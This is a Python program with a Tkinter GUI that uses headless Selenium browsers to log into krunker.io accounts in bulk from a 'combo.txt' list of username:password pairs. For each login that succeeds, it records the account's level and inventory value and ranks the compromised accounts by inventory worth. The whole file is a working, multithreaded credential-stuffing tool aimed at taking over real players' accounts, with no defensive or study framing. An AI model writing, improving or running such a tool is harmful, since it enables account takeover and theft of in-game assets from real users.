import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import messagebox
import threading
import time
import re
import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

# Global variables for GUI elements and threading
root = tk.Tk()
status_label = None
log_text = None
start_button = None
stop_button = None
is_running = False
threads = []    
processed_lines = 0  # Counter for processed lines
counter_label = None  # To display the count
num_threads = 1  # Default number of threads
tab_views = []

# Define a lock for thread safety
lock = threading.Lock()

# Track processed usernames across all threads
processed_usernames = set()

# Define the log function
def log(message, tab_index=None):
    with lock:
        if tab_index is None:
            log_text.insert(tk.END, message + "\n")
            log_text.see(tk.END)
        else:
            if tab_index < len(tab_views):
                tab_views[tab_index].insert(tk.END, message + "\n")
                tab_views[tab_index].see(tk.END)

# Function to extract info from profile
def extract_info(driver):
    try:
        # Extract level
        level_element = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.XPATH, "//div[@class='pSt' and contains(text(), 'LVL')]"))
        )
        level_text = level_element.text.replace("LVL", "").strip()
        level = int(re.sub(r'[^\d]', '', level_text))  # Remove non-numeric characters and convert to int

        # Extract inventory value
        inventory_element = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.XPATH, "//div[@class='pSt' and contains(text(), 'Inventory')]"))
        )
        inventory_value_text = inventory_element.find_element(By.XPATH, "./strong").text.strip().replace(",", "").replace("~", "")
        inventory_value = int(re.sub(r'[^\d]', '', inventory_value_text))  # Remove non-numeric characters and convert to int

        return level, inventory_value
    except Exception as e:
        log(f"Error extracting info: {str(e)}", None)
        return None, None

# Function to handle login and data extraction
def login_and_extract(username, password):
    global processed_lines
    try:
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        
        driver = webdriver.Chrome(options=chrome_options)
        
        url = f'https://krunker.io/social.html?p=profile&q={username}'
        driver.get(url)
        
        # Wait for OneTrust consent banner
        try:
            accept_button = WebDriverWait(driver, 30).until(
                EC.element_to_be_clickable((By.ID, "onetrust-accept-btn-handler"))
            )
            accept_button.click()
        except TimeoutException:
            log(f"Timeout: OneTrust accept button not found for {username}, moving to next.", None)
            return
        
        # Fill login form
        try:
            login_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "profileLogin"))
            )
            login_button.click()
            
            acc_name_input = WebDriverWait(driver, 10).until(
                EC.visibility_of_element_located((By.ID, "accName"))
            )
            acc_name_input.send_keys(username)
            
            acc_pass_input = WebDriverWait(driver, 10).until(
                EC.visibility_of_element_located((By.ID, "accPass"))
            )
            acc_pass_input.send_keys(password)
            
            login_acc_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "accBtn"))
            )
            login_acc_button.click()
            
            # Check if login was successful
            try:
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//i[@class='material-icons' and contains(@style, 'color:#3be354')]"))
                )
                # Successful login
                level, inventory = extract_info(driver)
                if level is not None and inventory is not None:
                    log(f"Username: {username}, Level: {level}, Inventory Value: {inventory}", None)
                    
                    # Write to success file (assuming thread safety with lock)
                    with lock:
                        with open("success.txt", "a") as success_file:
                            success_file.write(f"Username: {username}, Level: {level}, Inventory Value: {inventory}\n")
                    
                    # Export to inventory.txt (sorted by Inventory Value descending)
                    export_sorted_data("inventory.txt", "Inventory Value", 2)
                    
                    # Export to level.txt (sorted by Level descending)
                    export_sorted_data("level.txt", "Level", 1)
                
            except TimeoutException:
                # Failed login
                log(f"Failed login for {username}, moving to next.", None)
            
        except TimeoutException:
            log(f"Timeout: Login elements not found for {username}, moving to next.", None)
            
    except WebDriverException as e:
        log(f"WebDriver exception for {username}: {str(e)}", None)
    except Exception as e:
        log(f"Error processing username: {username}", None)
        log(f"Error: {str(e)}", None)
    finally:
        driver.quit()

# Function to export sorted data
def export_sorted_data(filename, sort_key, value_index):
    # Read from success.txt and sort by the specified key (1 for Level, 2 for Inventory Value)
    with lock:
        with open("success.txt", "r", errors='ignore') as file:
            lines = file.readlines()
        
        # Sort lines based on the value_index (1 for Level, 2 for Inventory Value)
        lines.sort(key=lambda line: int(line.split(", ")[value_index].split(": ")[1].replace(",", "").replace("~", "")), reverse=True)

        # Write sorted lines to filename
        with open(filename, "w", errors='ignore') as outfile:
            for line in lines:
                outfile.write(line)

# Function to run thread for processing combos
def run_thread(combos):
    global processed_lines
    while combos:
        with lock:
            if not is_running:  # Check if script stopped
                return
        
        combo = combos.pop(0).strip()  # Pop the first combo for processing
        if ':' in combo:
            username, password = combo.split(':', 1)
            username = username.split()[0]  # Extract username before any whitespace or delimiter
            
            # Check if username has already been processed
            if username in processed_usernames:
                continue  # Skip if username already processed
            
            # Process username
            log(f"Trying username: {username}", None)
            login_and_extract(username, password)
            time.sleep(1)
            
            # Log usage of the combo and move it to used.txt
            with lock:
                with open("used.txt", "a", errors='ignore') as used_file:
                    used_file.write(f"{combo}\n")
                
                # Remove combo from combo.txt
                with open("combo.txt", "r", errors='ignore') as combo_file:
                    lines = combo_file.readlines()
                
                with open("combo.txt", "w", errors='ignore') as combo_file:
                    for line in lines:
                        if line.strip() != combo:
                            combo_file.write(line)
            
            processed_usernames.add(username)

        # Update processed lines count
        processed_lines += 1
        update_counter_label()  # Update GUI counter

# Function to start the script
def start_script():
    global is_running, threads, processed_lines, num_threads
    if is_running:
        messagebox.showinfo("Info", "Script is already running.")
        return
    
    is_running = True
    threads = []
    processed_lines = 0  # Reset processed lines count
    update_counter_label()  # Update GUI counter display

    # Read number of threads from the entry field
    try:
        num_threads = int(num_threads_entry.get())
    except ValueError:
        num_threads = 1
        messagebox.showerror("Error", "Invalid number of threads. Using default value of 1.")
    
    # Read all combos from combo.txt
    all_combos = []
    with open("combo.txt", "r", errors='ignore') as file:
        for line in file:
            try:
                all_combos.append(line)
            except UnicodeDecodeError:
                log(f"Skipping line due to UnicodeDecodeError: {line}")
    
    # Split combos into chunks for each thread
    split_combos = [all_combos[i::num_threads] for i in range(num_threads)]
    
    # Start threads
    for i in range(num_threads):
        thread = threading.Thread(target=run_thread, args=(split_combos[i],), name=f"Thread-{i}")
        thread.start()
        threads.append(thread)
    
    # Update GUI to show script is running
    status_label.config(text="Status: Running")
    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)
    
    root.after(1000, check_threads)  # Check thread status periodically

# Function to stop the script
def stop_script():
    global is_running
    is_running = False
    
    for thread in threads:
        thread.join()  # Wait for threads to finish
    
    status_label.config(text="Status: Stopped")
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

# Function to update counter label
def update_counter_label():
    if counter_label:
        counter_label.config(text=f"Lines processed: {processed_lines}")

# Function to check thread status and update GUI
def check_threads():
    global is_running
    if is_running and any(thread.is_alive() for thread in threads):
        root.after(1000, check_threads)  # Continue checking every second
    else:
        status_label.config(text="Status: Completed")
        start_button.config(state=tk.NORMAL)
        stop_button.config(state=tk.DISABLED)

# Function to create GUI
def create_gui():
    global status_label, log_text, start_button, stop_button, counter_label, num_threads_entry, tab_views

    root.title("Selenium Script GUI")
    root.geometry("1000x600")

    # Main Frame
    main_frame = ttk.Frame(root)
    main_frame.pack(fill=tk.BOTH, expand=True)

    # Left Frame (Console)
    console_frame = ttk.Frame(main_frame, width=700)
    console_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)

    # Status Label
    status_label = ttk.Label(console_frame, text="Status: Idle")
    status_label.pack(side=tk.TOP, anchor=tk.W, pady=5)

    # Log Text
    log_text = scrolledtext.ScrolledText(console_frame, wrap=tk.WORD)
    log_text.pack(fill=tk.BOTH, expand=True)

    # Right Frame (Controls)
    control_frame = ttk.Frame(main_frame, width=300)
    control_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=10, pady=10)

    # Number of Threads Label
    num_threads_label = ttk.Label(control_frame, text="Number of Threads:")
    num_threads_label.pack(side=tk.TOP, anchor=tk.W, pady=5)

    # Number of Threads Entry
    num_threads_entry = ttk.Entry(control_frame)
    num_threads_entry.insert(0, "1")
    num_threads_entry.pack(side=tk.TOP, fill=tk.X, pady=5)

    # Start Button
    start_button = ttk.Button(control_frame, text="Start Script", command=start_script)
    start_button.pack(side=tk.TOP, fill=tk.X, pady=5)

    # Stop Button
    stop_button = ttk.Button(control_frame, text="Stop Script", command=stop_script, state=tk.DISABLED)
    stop_button.pack(side=tk.TOP, fill=tk.X, pady=5)

    # Counter Label
    counter_label = ttk.Label(control_frame, text="Lines processed: 0")
    counter_label.pack(side=tk.TOP, anchor=tk.W, pady=5)

    # Tabs for Selenium Viewing
    tab_control = ttk.Notebook(root)
    tab_control.pack(expand=1, fill='both')

    tab_views = []
    for i in range(1, 5):  # Maximum of 4 separate tabs for threads
        tab = ttk.Frame(tab_control)
        tab_control.add(tab, text=f"Thread {i}")

        # Log to tabs
        tab_view = scrolledtext.ScrolledText(tab, wrap=tk.WORD)
        tab_view.pack(fill=tk.BOTH, expand=True)
        tab_views.append(tab_view)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
